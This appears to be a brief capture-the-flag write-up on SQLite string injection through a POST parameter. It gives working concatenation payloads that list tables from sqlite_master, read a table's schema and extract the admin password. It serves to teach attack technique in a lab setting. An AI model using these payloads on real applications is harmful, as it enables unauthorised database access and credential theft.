# 25 AUG 2021 | sqlite string injection

we need to make account to be able to post so let's do it :) 

Try a ' 

![image](https://user-images.githubusercontent.com/67979878/130714242-df167936-792a-4ca8-af50-ab3ce460ea6f.png)

it seems a sqlite injection . .

we have a post parameter `idea` is sent in body so let's play around it  .

![image](https://user-images.githubusercontent.com/67979878/130714349-99cac1a7-82a2-4794-9307-55b6eaba2194.png)

we want to make a correct query try `''` and worked with no error :

![image](https://user-images.githubusercontent.com/67979878/130714508-468a2794-3e26-4290-87be-cd3d5d9f35f1.png)


payload  to use : `' || statement ||'`

test #1 

`` '||(SELECT 1 )||' --  ``

it returns no errors so it seems we have one column to query about . good :) 


test #2 

`` '||(SELECT tbl_name from sqlite_master) ||'  --  ``

![image](https://user-images.githubusercontent.com/67979878/130714799-ee57bcd7-e8c6-48be-83ee-44797cc7dde3.png)

#####  table_name = xde43_users 

let's get columns :) 

test #3 

``  ' ||(SELECT sql from sqlite_master where name= 'xde43_users' )|| '  ``


![image](https://user-images.githubusercontent.com/67979878/130714937-e82581fb-8548-44ab-96f8-4ec4c15c8aa1.png)


 we want admin password so :
 
 
 ``  ' ||(SELECT password from xde43_users WHERE role= 'admin')|| '  ``




![image](https://user-images.githubusercontent.com/67979878/130715092-b50168b6-2651-4904-b44d-b6c55a7e0489.png)



# done 
























